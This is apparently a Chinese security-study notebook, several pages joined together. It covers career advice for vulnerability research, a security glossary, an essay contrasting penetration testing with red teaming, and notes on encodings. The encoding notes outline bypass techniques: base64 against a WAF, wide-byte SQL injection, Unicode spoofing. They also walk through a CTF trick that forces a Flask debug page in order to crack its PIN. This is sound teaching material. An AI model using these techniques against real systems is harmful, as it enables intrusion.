每个工具分别有什么功能？原理是什么？涉及哪些知识？ 能否改进优化？能否发展，组合出新的功能？ 以专家为线索 你的技术方向里有哪些专家？ 他们的邮箱、主页、社交网络帐号是什么？ 他们在该方向上有哪些作品？发表过哪些演讲？ 跟踪关注，一个一个学 处理好学习、工作和生活 学习、工作和生活是矛盾统一的 三者都需要时间，你一天只有24小时 调和矛盾的关键：提高效率 对没有一个好爸爸的人来说，你的学习、工作会影响你能不能追求诗和远方 有好爸爸也要学习，因为能力之外的资本等于零： 如何提高效率 做好预研，收集相关前人成果，避免无谓的重复劳动 在可行性判断阶段，能找到工具就不写代码，能有脚本语言写就不要用编译语言，把完美主义放在最终实现阶段 做好笔记并定期整理，遗忘会让所有的投入都白白浪费 多和同事交流，别人说一个工具的名字可能让你节约数小时 咖啡可以提高思维效率，而且合法 无论怎么提高效率，要成为专家，都需要大量的时间投入 如何学习 学校教育的方式是：由浅入深，先理论再实践，多门基础课一起平面推进。这种方式的好处是学得扎实，适合批量培养人。缺点是出活儿慢，没有利用人的内驱力。 师傅带徒弟或者自学的情况下就不一定要按批量教学的方式来。 我个人的经验是不管会不会，先动手搞起来。而且不搞太入门的，要难度中等，这样才有成就感，能形成正反馈，调动内驱力。过程中会遇到很多不懂的东西，没关系，遇到什么就去学什么。这个阶段不求多求全，以把手头的东西搞起来为目标。搞成了再设定一个更难的新目标。新老目标之间要有继承性。最后等高难度目标也能搞定了，再转过头系统性地去看看相关技术资料，加固一下地基。 如何研究 十几年前流行过一篇文章叫《把信带给加西亚》。前些年又流行过批判这篇文章。研究工作大多和那位送信者面临的情况差不多：有一封信交给你，让你送给加西亚。加西亚在哪儿？没人知道。你得自己找，把信送到。 做研究工作，第一步是资料查找。这是从事研究探索最基础的能力，非常重要。而且也没有想象的那么简单，并不是每次把想问的问题输入搜索引擎都能得到答案。所以没找到答案可能不是没有答案。具体用哪些关键词、怎么组合这些词、怎么根据第一步搜索结果中的线索再提取关键词、怎么判断搜索结果有效性，等等，这些都需要反复实践和归纳思考。 通过资料查找，就可以知道是否有人做过类似工作，是否有可直接参考的资料。有时候你会发现全世界也没人做过类似工作。这时就需要针对目标，进行路径分析，看看有哪些路可能通往目标，然后再针对这些分解出的路径再进行资料查找。 这种目标分解有时候会不止一层。也就是说那些分解出来的路径也可能没有资料。那就需要针对路径再作路径分解。然后遍历这些路径。 从历史经验看，天分高、脑子快、手速快、对技术路径有敏锐直觉的人，当然能干得快一些。而一般人只要愿意坚持遍历路径，能扛得住长期得不到正反馈，大部分也能干出成绩。就是会痛苦一些。别人乐在其中，你苦在其中。不怕苦的话也行。 如何成长 刚参加工作的时候，部门接到各类任务，领导问我能不能干，我一般都说让我去试试吧。然后抓紧时间查资料，学习和这项工作有关的内容。 勇敢接受工作挑战，可以让人快速成长。也会让你有更多的机会，这是个马太效应的事儿。我记得当时的领导给过我这样一个评语：“不管什么工作，交给你我就放心了，反正你总有办法搞定”。 当然也要了解清楚需求，特别是对时间的要求，评估好是否在自己跳一跳能够得着的范围内。 敲代码的，如何转行挖掘漏洞？ “本人写了五六年Linux C，应用层业务为主，技术含量不算太高；C语言比较熟练，C++仅做过Win下MFC的简单项目；Linux kernel大致了解，写过简单的驱动；对于理论、算法之类的比较薄弱。是否可转行Linux或Win下漏洞挖掘？还需要补充点什么知识？多谢前辈们的指点。” 给你个建议：别想那么多，先干起来再说。 我找到第一个漏洞的时候，还在医院实习，只会写几行批处理。为了写 PoC 需要学编程语言，看电脑报介绍过 Perl，就去买了本《Perl 编程 24 学时教程》。后来为了写更好的 Exploit 学了 C 语言。再后来，为了各种研究读各种 RFC、调各种程序、读各种代码、试各种工具，等等。干这行，你永远不知道未来需要会什么。所以什么都可以不会，但不能学不会。 程序员如何判断自己是否适合做安全研究 有人跟我说以前是程序员，问能否转干安全研究。我问他有没有自己研究过什么，他说还没有，但一直很感兴趣。然后我问他感兴趣了多少年，他就沉默了。当然，这至少说明他脑子很快，迅速知道我想表达什么：天天对着电脑，真感兴趣怎么可能从来没研究过——你跟林志玲睡一个床能好几年一直盖棉被纯聊天？ 网络安全初学者应该看什么书 前阵子遇到一个对网络安全感兴趣的中学生，让我推荐一本书。我告诉他： 随便找一个书店，在网络安全分类下面随便找一本书，然后从第一页开始学。 如果觉得学不下去，那可能是书有问题，就换一本。 如果换一本还是学不下去，就再换一本。 如果换了三四本都还学不下去，可能就不是书的问题。 如果能学得下去，等这本书学完，接下来该学什么，你会有自己的想法，不需要再问别人了。 信息安全方向就业要考哪些证书 这个问题问得很笼统，如果也笼统回答的话，只能说：信息安全专业学生如果以后想从事专业对口的工作，需要信息安全专业技能，很多证书都可以提高就业机会。 具体举例子来说的话——比如在国内乙方就业，CISP 是有用的。因为安全企业如果要申请信息安全服务资质，就需要若干名有 CISP 证书的员工。而很多甲方招标会要求乙方企业有相关资质。 所以顺着这个思路，可以去查查各安全项目的招标公告，看看对企业要求了什么，再查查企业如果要具备这些要求，需要有什么证书的员工。那么这些证书就是显著有利于提高就业机会的。 信息安全专业有必要考研吗 如果确实对安全技术很感兴趣，自己读了很多资料，写了很多代码，做了很多研究，那未必要考研。 如果你不属于前一种人，又想干这行，那跟着导师做几年项目还是有好处的。 学院派的信息安全指的什么？ “在各个安全技术的群里感觉已经没办法交流了。我研究的是信息安全的框架、顶层设计、整体的解决方案，平时也花不少时间跟进技术。但是遇到过多次，我说了自己的一些观点，就招来嘲讽，说我是学院派，满是鄙夷口吻。为什么会是这样的局面？理论指导实践，实践证明理论，如果是学院派指的是研究信息安全理论的人，那这样的局面显然不利于信息安全行业的发展。” 我们常把从事信息安全技术研究的人分为学院派和工业派，分别指更偏向于理论的研究者，和更偏向于实践的研究者。 学院派和工业派之间的界限并不特别清晰。有些学院派搞的东西也很实用，工业派也常研究学院派的理论。信息安全领域很多东西都是由学院派开创、工业派完善的。理论和实践都很重要，学院派和工业派都不是贬义词。 不过需要注意，理论和空论还是要区分的。理论可以指导实践，空论只能指导扯淡。所以，上面说的两派之外，还有裘千丈派、索天响派等，这些也常被人称作“学院派”，但实际上他们不是学院派。有点像我们称呼一个姑娘为“小姐”，但她可能不是小姐，是失足妇女。 至于在沟通中被人以鄙视的语气称呼为“学院派”，可能是你的观点有问题，也可能是对方无法理解你的观点，但和学院派本身没啥关系。 信息安全专业的发展会受到文凭的限制吗？ 我们部门有名校博士，也有本科肆业的。企业招人的目标肯定是能力而不是文凭。有些大一大二的同学已经比硕士毕业生的平均水平高出很多。至少我个人会宁可要这些大一大二的同学，而不是招一个文凭漂亮但做不了事的人。 文凭是对能力的一种背书。就像我们只看标签无需品尝，就可以认为“勃艮第葡萄酒”很大概率上会比“门头沟葡萄酒”要强。然而，虽然文凭是获得入场资格的一种主流方式，但不是唯一方式。而且信息安全行业远比葡萄酒行业有更多更简单的方式让自己的能力为人所知。全真七子是一种发展路线，杨过也是一种发展路线。具体路怎么走，还得你自己根据自己的具体情况来判断。 信息安全工程师有全栈一说吗？ 『随着互联网的发展，应用层的花样越来越多，甚至连编程语言都层出不穷了。这样的时代背景下，一个合格的安全工程师，应该具备哪些技术栈呢？真的有人熟知渗透测试，还能对软件/APP逆向分析，而且能够挖掘内核级别的0Day吗？题主7年左右的安全学习背景，目前很困惑以后的发展方向。就我了解到的，渗透测试需要应对的环境太多了，能做好一个“脚本小子”都已实属不易。何况逆向分析和系统内核，更是需要强大的编程功底和计算机理论基础，再加上最近几年火热的工控安全和人工智能等等，到底该怎么规划安全路呢？』 信息安全工程师没有全栈一说，因为信息安全工程师默认就需要是全栈的。每个人都在往全栈的方向上走，只是走的阶段不同，最终能到达的地方不同而已。 比如你去做安全服务工程师，而“安全服务”这四个字背后可能是任何操作系统，任何网络环境，任何异常问题。比如你去做漏洞研究，而“漏洞研究”这四个字背后可能是各种不同协议，不同格式，不同系统，不同指令集。所以这不是学一点东西就能吃一辈子的行业。 具体到提问中所说的“真的有人熟知渗透测试，还能对软件/APP逆向分析，而且能够挖掘内核级别的0Day吗”，只是这三样的话，能做的人还挺多的。 网站越来越难渗透怎么办 『大家有没有发现，现在网站防御越来越高，漏洞也越来越少，安全在进步，网站也难渗透了，一些老牌工具很难扫出注入点了，如果弄不到后台其他的也做不了。现在的工具都是2010年前的了，现在教程也不多，以前的教程内容已经越来越不适合现在的网络了。现在也没有网站能给新手练手了。』 为什么用网上下载的工具很难扫描出安全问题了？因为你能下载别人也能下载。企业的安全部门里但凡只要有一个会用这些工具的人，就能自己把这些问题找出来，剩不到你手上。 十年前，很多企业的安全做的还很差，甚至没有网络安全部门，所以下载个工具扫一扫还能发现不少问题。现在一方面是企业自身安全能力提高了，另一方面网站开发者的安全能力也提高了。所以如果你只会用十年前的工具扫一扫，在今天自然会觉得很吃力。 然而，二十年前，随便找个工具扫一扫还可以发现很多远程管理弱口令、远程溢出漏洞。那么二十年前那些搞渗透测试的，在发现这些扫出来直接就能拿 root shell 的漏洞逐渐消失后是不是也很绝望？不是的。他们开始研究注入，研究 XSS，研究 CSRF，研究反序列化。所以他们才写出了你现在从网上下载的那些工具。 二进制安全也一样。二十年前的漏洞挖掘和利用都无比简单。二十年来，漏洞越来越难发现，越来越难利用。但二进制安全这个技术方向消失了吗？不但没有，而且发展越来越好。 对出身于普通家庭的人来说，工作有难度有门槛是好事。如果一个工作不难，那通常也不挣钱。如果又不难又还能挣钱，那人家为什么要让你来做的呢？找自己的堂侄表弟小舅子不好吗？ 做安全研究挖不到漏洞怎么办 这两年经常有人问类似“做安全研究挖不到漏洞怎么办”这样的问题，这里统一答复一下。 早年没有信息安全专业，搞漏洞研究的全都是因为爱好这个，自己主动来搞的。不适合干这个，搞不出来的，自然也就还干本行去了。所以早年没有人抱怨为什么研究不出东西。 现在信息安全专业开设的越来越多，有些同学看别人搞漏洞研究，自己也想搞。搞不出来，就四处找人问为什么自己搞不出来，怎么才能搞出来。 首先，必须要先泼一瓢冷水：由于性格、能力等多方面原因，无论是不是学信息安全专业的，世界上大部分人都不适合做漏洞研究，就像大部分人都不适合做职业运动员一样。 你们琢磨一下漏洞是什么？漏洞是程序员犯的错误。那些著名大公司软件的漏洞是什么？是一些面试好多轮才能入职的名校毕业的程序员犯的错误。而且这些公司里还有很多面试好多轮才能入职的名校毕业的人在做安全。他们都没查出来，才能留下来让你去发现。 我曾给微软中国的 QA 做过培训，和他们连续接触了数天。这些人体现出来的平均水平肯定在国内安全行业（不特指漏洞研究）之上，其中有几个还相当出色。 所以，挖不到漏洞是正常的，挖到才不正常。信息安全工作有很多方向，学信息安全，不一定非要都做漏洞研究。 学习网络安全时遇到瓶颈怎么办 “基础的那些sql，xss，csrf那些基本的都会了，但是想更进一步，不知道该怎么办了，有点迷茫，然后我就开始学习python和php，但是，学了一个月，回想一下，发现现在连一个小的脚本都不会写，应聘公司想以实习的目的去学习（ps：中专毕业的渣渣），没有上大学是不是很难应聘公司啊，请大神指点我一下，谢谢” 从事任何方向的技术研究，不知道该干什么的时候，就问自己四个问题： 这个方向上最新进展是什么？ 都知道吗？ 这个方向上最著名的专家有哪些？他们的研究都看过吗？ 这个方向上最著名的技术社区有哪些？精华帖都看过一遍吗？ 这个方向上最重要的文章、工具有哪些？文章都看过吗？工具都分析过吗？ 高手不愿和我交流怎么办 姚期智说：我看不出你的证明有什么错误，你的证明是对的。你要的杨振宁先生和张益唐先生的邮件地址分别是：xxxxxxxx、xxxxxxxx，你自己去跟他们联系。 张益唐说：这件事还是由你自己定夺，你说你证明了黎曼猜想就证明了黎曼猜想，你说你没有证明黎曼猜想就没有证明了黎曼猜想。 梦参老和尚说：我走的地点多，有的人曾经跟我说：“能像弘一法师、慈舟法师、虚云老和尚、倓虚老法师那些大善之士，在哪里有？老法师你给我介绍一个，我去跟他学习。 我说：“就是弘一法师在，你这个样子，他理都不理你。” 弘一法师，不是那么容易亲近的。他寮房的门永远是关着的，你想跟他说几句话，他没有时间跟你说。 慈舟法师，整天披着衣，讲完课，他就围着佛堂转：阿弥陀佛！阿弥陀佛！阿弥陀佛！ 倓虚老法师，他的事务多，接触的政府官吏多。我们这里有几位道友，曾经跟着他到过华南，如果你们想跟他多亲近，多说几句话，他没有那个时间，并不是他不慈悲。 虚云老和尚，他在禅堂讲开示，就是你亲近他的时候。不过一个月他才讲两次，你可以到得了他身边吗？即使他真的在你身边，你能得到他的智能吗？ 歌德说：读一本好书，就是和高尚的人谈话。 有了量子计算信息安全还有用吗 “题主今年大一，学习信息安全专业。一开始拼劲满满，下定决心当一名学霸。但在第一节计算机导论课上，老师列举计算机类型时，提到了量子计算机和光子计算机，而且说如果这些计算机普及，就不需要网络安全员了。” 你们老师可能并不清楚量子计算机和光子计算机是什么、能干什么，但认为自己明白并向学生布道，而这可能是由于把看科技新闻作为学习新知识的主要方法而导致的。 有了量子通信信息安全还有用吗 量子通信（无论是量子密钥分发，还是严格意义上的量子通信）的目标是对抗窃听信道的攻击，尤其是对抗窃听光缆。 漏洞攻击、木马病毒、钓鱼欺诈……等等等等绝大多数一般人能遇上的信息安全问题和量子通信要解决的问题都没什么关系，也不是量子通信能解决的。假使你现在正在被人用漏洞攻击，刚进行到50%，有一个仙女挥动魔法棒，瞬间在全球普及了量子通信，那接下来的50%也会照常进行，无论你还是攻击者都不会感觉到任何不同。 有哪些Linux逆向相关的学习资料推荐 SEEDLabs是雪城大学杜文亮教授创立的，十几年来得到了全球上百所大学的认可。建议每个认为找不到合适学习资料的人都看看，之后至少可以对自己到底是不是真想学有更接近于真实的认识。 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-11-25 17:45:28 "},"07.基础知识/名词解释.html":{"url":"07.基础知识/名词解释.html","title":"常见名词与概念","keywords":"","body":" 常见名词 解释 0day(Zero-day) 没有补丁的安全漏洞 Nday 官方发布了补丁，但该漏洞仍然大量未修复，存在一定可利用性 POC 一段无害的用来证明漏洞存在的代码 EXP（exploit） 一段对漏洞如何利用的详细说明或者一个演示的漏洞攻击代码 payload（有效载荷） 指成功 exploit 之后，真正在目标系统执行的代码或指令 CVE Common Vulnerabilities & Exposures 公共漏洞和暴露 CVE编号--漏洞标签 ShellCode 一段16进制机器码，可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，从而执行任意指令，EIP寄存器，它里面存放的值是CPU下次要执行的指令地址，因此可以通过修改EIP寄存器的值来执行shellcode FUZZ 模糊测试：随机输入，观察输 CMS 内容管理系统：指的是一种内容编辑程序。就像在博客写文章一样，不需要懂得编程的人，也可以通过CMS发布，更改，管理内容。 CNVD China National Vulnerability Database 国家信息安全漏洞共享平台 Rootkit 载入到操作系统内核中的恶意软件，具有root权限 WAF Web应用防火墙，具有针对 HTTP/HTTPS 的安全策略 堡垒机 监控和记录运维人员对网络内的服务器、网络设备、安全设备、数据库等设备的操作行为，以便集中报警、及时处理及审计定责。 彩虹表 空间换时间，通过哈希碰撞破解哈希值 供应链攻击 攻击软件供应商，如向更新程序中注入木马 沙箱 虚拟系统程序： 在隔离环境中，用以测试不受信任的文件或应用程序等行为的工具 域名泛解析 *.a.com指向同一IP OSINT 公开来源情报（OSINT, Open Source INTelligence）是从公开来源收集到的情报 IDS Intrusion Detection System（入侵检测系统），旁路部署 IPS Intrusion Prevention System（入侵防御设备），串联部署 SA Situation Awareness（态势感知），态势感知是一种基于环境的、动态、整体地洞悉全网安全风险的能力。它以安全大数据（采集全网流量数据和安全防护设备日志信息）为基础，从全局视角对全网安全威胁进行发现识别、理解分析展示和响应处置，并预测发展趋势，为后续网络安全的相关决策与行动提供数据依据。 AV anti-virus killer（反病毒杀手），防病毒软件如WinowsDefinder，360 上/下游代理 请求：客户端→下游代理→上游代理→服务端 响应：服务端→上游代理→下游代理→客户端 RASP 运行时应用程序自我保护（Runtime application self-protection，简称RASP）RASP采用基于攻击行为分析的主动防御机制，严防文件读写、数据访问、命令执行等Web应用系统命脉（在Web应用程序执行关键的Java API之前插入防御逻辑（API HOOK），从而控制原类方法执行的业务逻辑） 路由器 路由器（Router）是一种网络设备，用于将数据包从一个网络转发到另一个网络。主要功能根据网络协议决定最佳的路径来转发数据，网络地址转换（NAT） 交换机 交换机是一种网络设备，用于在局域网中传输数据包。它有多个端口，可以连接多台计算机或其他网络设备，如打印机、服务器等。交换机能够根据每个数据包的目标地址，将其转发到对应的目标设备，实现设备之间的通信和数据传输。交换机还可以提供一些额外的功能，如虚拟局域网（VLAN）划分、安全策略配置等。 MVC设计思想 ORM--对象关系映射 蠕虫、病毒之间的区别 正向/反向代理 https://www.cloudflare.com/zh-cn/learning/cdn/glossary/reverse-proxy/ 正向代理 转发代理，通常称为代理、代理服务器或 Web 代理，是位于一组客户端计算机之前的服务器,确保没有源站直接与该特定客户端通信 ​ 在标准的互联网通信中，计算机 A 将直接与计算机 C 保持联系，客户端将请求发送到源服务器，并且源服务器将响应客户端。当存在正向/转发代理时，A 将请求发送到 B，B 随后将请求转发给 C。C 将向 B 发送响应，而 B 则将响应转发给 A。 反向代理 反向代理是位于一个或多个 Web 服务器前面的服务器，拦截来自客户端的请求，确保没有客户端直接与该源站通信。 ​ 通常，来自 D 的所有请求都将直接发送到 F，而 F 会直接将响应发送到 D。使用反向代理，来自 D 的所有请求都将直接发送给 E，而 E 会将其请求发送到 F 并从 F 接收响应，然后将适当响应传递给 D。 对象 优点 正向/转发代理 客户端 匿名，绕过访问限制 反向代理 服务端 更加安全，提高服务器性能 静态web和动态web https://help.dedecms.com/shiyongshouce/moshi/mingci.html 伪静态即是网站本身是动态网页如.php、.asp、.aspx等格式动态网页有时这类动态网页还跟\"?\"加参数来读取数据库内不同资料，伪静态就是做url重写操作(即rewrite)。 demo 跳转需求： 访问http://www.kevin.com/p/123456.html 跳转成 http://a.aa.com/p/123456 配置如下: rewrite ^/p/(\\d+).html http://www.kevin.com/p/$1 last; 解释说明： \\d是数字的意思 +是最少一个{1,} 1到无穷大{1,3} 这样是1-3位数。 DDOS攻击和CC攻击 DDoS攻击打的是网站的服务器，而CC攻击是针对网站的页面攻击的。 用术语来说就是，一个是WEB网络层拒绝服务攻击（DDoS），一个是WEB应用层拒绝服务攻击（CC）。 网络层就是利用肉鸡的流量去攻击目标网站的服务器，针对比较本源的东西去攻击（通信信道），服务器瘫痪了，那么运行在服务器上的网站肯定也不能正常访问了。 而应用层就是我们用户看得到的东西，就比如说网页，CC攻击就是针对网页来攻击的，CC攻击本身是正常请求，网站动态页面的正常请求也会和数据库进行交互的，当这种\"正常请求\"达到一种程度的时候，服务器就会响应不过来，从而崩溃。 彩虹表 https://zhuanlan.zhihu.com/p/105578739 彩虹表(rainbow table)是一个用于加密散列函数逆运算的预先计算好的表，常用于破解加密过的密码散列。如MD5，SHA1. 查找表常常用于包含有限字符固定长度纯文本密码的加密。 事先准备大量哈希链表： X：随机生成的明文 H：哈希函数 R：自定义函数 只保存开头和末尾位置即X和Rn。 对于经过H得到的密文C进行破解：首先使用R得到Y=R（C），再将Y与Rn进行比较。 ①如果相等，则说明密文C对应的明文P在哈希链表中的Rn-1处。原理见下图。 ②如果不相等，则说明密文C对应的明文P不在哈希链表中的Rn-1处。所以需要向前查找是否在Rn-2~R1处。 具体流程：对Y再用H和R函数，得到Y‘，与Rn比较，如果相等，则说明明文为Rn-2，如果不是，就重复步骤，直到所有哈希链表都查找过，说明破解失败。 防御手段：加密时使用盐值 堆和栈 堆和栈的区别 栈区保存声明的变量例如int a=1,由系统自动分配 堆区保存用户申请的变量例如malloc，b=&a 程序在编译变量和对函数分配内存都在栈上进行，且函数调用时参数的传递也是在栈上进行。 按值传递，按引用传递和按指针传递 https://www.junmajinlong.com/coding/pass_by_value_or_ref/ 按值传递 开辟新空间，将数据对象拷贝一份副本到新空间中 int a=10; int b=a; 这时候修改a或b的值，都不会影响另一个变量的值 按引用传递 int a=10; int &b=a; 不开辟新空间，只是给数据对象所在空间名起了一个别名 这时候修改a或b的值，应该会影响另一个变量的值，因为二者的地址是一样的。 按指针传递 在c或c++可以操作指针的语言中 int a=10; int* b=&a; 在堆内存中开辟空间用来保存指针b，b指向a所在的地址（保存a的地址）。 阻塞和非阻塞，同步和异步，回调函数 例子 我要看足球比赛，但是妈妈叫我烧水，电视机在客厅，烧水要在厨房。家里有2个水壶，一个是普通的水壶，另一个是水开了会叫的那种水壶。我可以： 用普通的水壶烧，人在边上看着，水开了再去看球。（同步，阻塞）这个是常规做法，但是我看球不爽了。 用普通水壶烧，人去看球，隔几分钟去厨房看看。（同步，非阻塞）这个又大问题，万一在我离开的几分钟水开了，我就麻烦了。 用会叫的水壶，人在边上看着。（异步，阻塞）这个没有问题，但是我太傻了。 用会叫的水壶，人去看球，听见水壶叫了再去看。（异步，非阻塞）这个应该是最好的。 等着看球的我：阻塞 看着电视的我：非阻塞 普通水壶：同步 会叫的水壶：异步 所以，异步往往配合非阻塞，才能发挥出威力。 回调函数 在上面的例子中，用会叫的水壶，人去看球，听见水壶叫了再去看。（异步，非阻塞）这一方法的实现就是使用了回调函数。 MVC架构 小端序和大端序 HTTPS单向认证 HTTPS双向认证 CGI与fastCGI 关于CGI和FastCGI的理解 - 天生帅才 - 博客园 X64、X86和X86_64 X64、X86和X86_64都是x86指令集架构 X86是x86指令集架构的32位版本。 \"x86\"这个术语源自Intel 8086处理器，它是x86家族的第一款处理器。 X64和X86_64都是x86指令集架构的64位扩展（X86_64将x86架构的兼容性与x64架构的增强功能结合起来） DAST、SAST、IAST 一文洞悉DAST、SAST、IAST ——Web应用安全测试技术对比浅谈 - 安全牛 (aqniu.com) 什么是开发环境、测试环境、UAT环境、仿真环境、生产环境？ dev环境：开发环境，外部用户无法访问，开发人员使用，一般来讲，开发环境中的服务器配置比较随意主要是用来测试的，无用户交互，并且要打开错误报告，方便程序员调试。 test环境：测试环境，外部用户无法访问，专门给测试人员使用的，版本相对稳定。 pre环境：性能评估测试（压测）环境，外部用户可以访问，但是服务器配置相对低，其它和生产一样。 uat环境：验收测试环境，主要作为客户体验的环境。 pro环境：生产环境，面向外部用户的环境，连接上互联网即可访问的正式环境。 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-24 21:46:36 "},"07.基础知识/渗透测试和红队的区别.html":{"url":"07.基础知识/渗透测试和红队的区别.html","title":"转载--渗透测试和红队的区别","keywords":"","body":" 本文来自孟极实验室，版权归作者所有 谈谈渗透测试和红队的区别 最近在各种安全相关的资讯或者技术文章中，越来越多的提到渗透测试（渗透 Testing）和红队（Red Team）这个两个词，而且很多地方是把这两个词的意思混为一体，认为是相同的东西。虽然这两者在方法和实施过程中存在一定相似甚至重合的部分，但是渗透测试和红队还是存在一些本质的差异。本文将分别对两者进行定义和描述，方便企业根据自身安全需求选择合适的安全服务，也能以此识别那些打着红队幌子实际干着渗透测试活的安全公司。 渗透测试 渗透测试是对给定的目标系统进行安全测试，找出漏洞或风险的过程。渗透测试工程师会从不同的层面（包括应用层、网络层、系统层甚至物理层）对目标系统进行脆弱性分析，尝试找出尽可能多的漏洞、配置错误或其他安全风险，并尝试对这些找到的漏洞进行组合利用，最终获取到访问关键隐私数据的权限（隐私数据包括用户信息或者商业秘密等）。渗透测试过程中对漏洞的利用一方面能证明漏洞真实存在，另一方面这些漏洞的利用结果也能揭示出目标系统所面临的风险等级。 渗透测试专注于对给定的系统进行测试，存在明确的测试目标和测试边界。企业会指定测试起始时间和结束时间，测试时长一般为1到2周。测试目标可能是web系统、工业控制网络、内部办公网络等等。各类众测平台上的测试任务本质上就是渗透测试任务，这些任务都会明确测试范围，比如指定web系统域名、指定测试的APP等。 一般安全企业提供的渗透测试服务通常可以分解成一组针对不同系统的测试任务，如针对web系统的测试任务、针对内部办公网的测试任务、社会工程学测试任务等等。 渗透测试在评估系统或网络的安全性时，通常会忽略企业里其他运行环境的安全限制。例如，内网渗透测试将从内网中恶意用户（例如恶意员工或被入侵的员工机器）的角度评估企业的网络安全性。测试工程师到达现场后，将会直接将笔记本电脑接入内部办公网络开始进行测试。内网渗透测试会忽略黑客在内网中获得初始落脚点这个步骤(通常是通过钓鱼邮件或其他方式欺骗员工运行恶意程序)，直接从已有内网接入权限开始进行测试。内网测试报告会包含内网中暴露的有漏洞的服务、未打补丁的系统、错误的系统配置、敏感文件共享等等安全问题，但是不会包含黑客最初如何获取内网接入权限这个步骤。 在渗透测试过程中，企业中负责防护的安全团队一般不会直接参与，为了配合渗透测试，企业有时会关闭某些安全防护软件或禁用安全策略，方便测试工程师找出更多的安全漏洞。 当整个渗透测试活动结束后，工程师会出具一份渗透测试报告，里面包含所有发现的漏洞列表以及每个漏洞具体的利用步骤和过程，同时会依据漏洞危害给出相应的威胁等级评分。 红队 尽管红队测试在有些攻击技术方面类似渗透测试，但不同于渗透测试尽量多找漏洞的目标，红队测试的任务往往是拿下某个特定的业务目标(比如公司某个项目的源代码，公司竞标标书和底价等商业机密，某个高层管理人员的邮箱或个人机等) 。红队要模拟真实世界中的极具目的性且不希望被检测到的恶意攻击者（受竞争对手雇佣的恶意黑客，收集政治、经济和科技情报的境外国家资助的黑客团伙等），红队测试某种程度上可以说是合法的高级持续性威胁(APT)。在这种完全贴近真实攻击的测试活动中，能够测试企业安全防护体系的阻断（prevention）、检测（detection）和响应（response）能力。 渗透测试中只关注给定目标系统的漏洞，红队测试则完全不一样。红队在测试过程中关注的是如何规划一条攻击路径来达到目的。在整个红队测试过程中不一定要也不一定会发现目标组织的漏洞，只要能达到目的，任何形式的攻击手段都可以使用，包括但不限于web或者操作系统漏洞、社会工程学、物理渗透、攻击上下游合作供应商等。 在红队测试开始前，除了任务目标外，不会给到红队关于目标企业的任何其他信息。红队需要通过各种渠道去搜集目标的物理位置、公开的网络系统和服务、组织架构以及雇员等信息，然后根据收集的信息制定攻击计划并实施。被测企业并不清楚（或仅有少数人清楚）攻击将于何时发起，将以何种方式进行。红队测试的持续时间一般比渗透测试更长，可以达到4到6周甚至更长（想想看真实APT攻击中长达数月的潜伏和持续渗透）。 红队在实施攻击时，会尽量隐藏自己的踪迹，另外还会详细记录每个攻击行为的具体实施时间，在整个行动结束后需要与组织中的防御检测部门(即蓝队)的检测响应时间表进行核对，以此来评估防御检测机制的有效性和响应速度，同时检查蓝队在哪些方面存在漏报和响应不及时，帮助蓝队更好的发现防御检测层面的弱点。这一点CS做的很好，可以导出红队的详细操作日志和时间。 结语 两者并没有哪个更好之说，对于企业来讲，先要搞清楚具体的场景和安全需求，才能确定需要的是渗透测试还是红队测试。对于新上线的业务系统，需要搞清楚存在那些漏洞以及漏洞可能造成的危害时，需要的是渗透测试；如果企业各个子系统都已经进行过渗透测试，并且存在成熟的漏洞管理、防御检测以及应急响应机制，另外还想要对企业整体安全环境进行评估，了解企业在面临真正的安全攻击事件时，是否有能力防御或者检测并及时响应，那么需要的便是红队评估。 最后说一点，在很多人的认知里面，一个企业被攻破一定是因为存在安全漏洞或者配置错误之类的安全问题，这是不正确的。如果真这么简单，那只要按时打补丁，就能防住所有没有0day的恶意黑客甚至防住APT攻击了。上文已经说过，红队测试过程中不一定会发现安全漏洞，很多时候不需要安全漏洞就能打穿一个企业。而现今的安全市场，很多企业还是以漏洞数量来评定安全服务团队的能力，就导出现了很多安全服务报告硬凑漏洞数量的怪象。在这种大环境下，企业可能反而认为没有发现安全漏洞但打穿了他们的红队安全能力不行，或者认为纯粹是偶然侥幸才能得手。这是一个认知升级的过程，什么时候能不以漏洞数量来评定安全服务能力，才能说真正理解了安全和攻击。 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-26 18:38:33 "},"07.基础知识/编码.html":{"url":"07.基础知识/编码.html","title":"编码","keywords":"","body":"编码的由来 计算机存储的任何数据，包括各种文本、图片、音视频文件等等，实际上都是一串二进制数字01字节序列组成的。 字节一般用来存储与网络传输，这样可以节省存储空间与网络传输带宽。而字符主要是用于显示，方便大家阅读。 编码主要是为了存储传输，而解码是为了方便阅读 编码方式的确立 可以通过http消息头的accept-encoding指定 html中的charset=”UTF-8″ 应用本身的编码方式 base64编码 编码表 大小写字母，[0,9]，+，/ 加密 每6个字符为一组 解密 每8个字符为一组 加密时不足的会补上= rot13 明/密文空间：字母表 操作：右移13位 可逆运算 url编码 URL原理、URL编码、URL特殊字符 特殊字符 URL中的保留和不安全字符 - atzuge - 博客园 在哪里发生 当我们向服务器发送数据时，浏览器就会自动将需要编码的字符进行URL编码（可以在数据包中看到）,然后服务器接收到数据包后，也会自动解码URL编码后的字符。 Ascii 长度：固定1字节 0~126个字符，其中前32个字符为不可打印字符 Unicode字符集--万国码 形式：U+数字 或者 16进制形式\\u8fd9\\u662f\\u4e00 长度：固定2字节 https://www.compart.com/en/unicode UTF UTF是Unicode Transformation Format(统一码转换格式)，变长Unicode编码。 常见的有UTF-8,UTF-16,UTF-32 jsfuck http://www.jsfuck.com/ https://blog.csdn.net/qq_36539075/article/details/79946099 HTML实体编码 &#36825 编码安全 base64编码绕过 奇安信攻防社区-从RFC看如何使用Base64编码绕过WAF 编码前后不一致 SQL宽字节注入 文件编码不同，导致报错 [NSSRound#6 Team]check(Revenge) @app.route('/download', methods=['POST']) def download_file(): filename = request.form.get('filename') if filename is None or filename == '': return '?' filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename) if '..' in filename or '/' in filename: return '?' if not os.path.exists(filepath) or not os.path.isfile(filepath): return '?' if os.path.islink(filepath): return '?' if oct(os.stat(filepath).st_mode)[-3:] != '444': return '?' with open(filepath, 'r') as f: return f.read() with open(filepath, 'r') as f，这里mode为r，默认为utf-8编码。 所以当我们将gbk编码的文件上传后，读取时就会报错，从而出现debug界面 这时候就可以尝试进行Flask的PIN码破解 Unicode欺骗 原理简单来说就是对字符串的标准化操作导致unicode字符转换成了与他同形的ascii字符。 Web 基于ASIS 2019：Unicorn 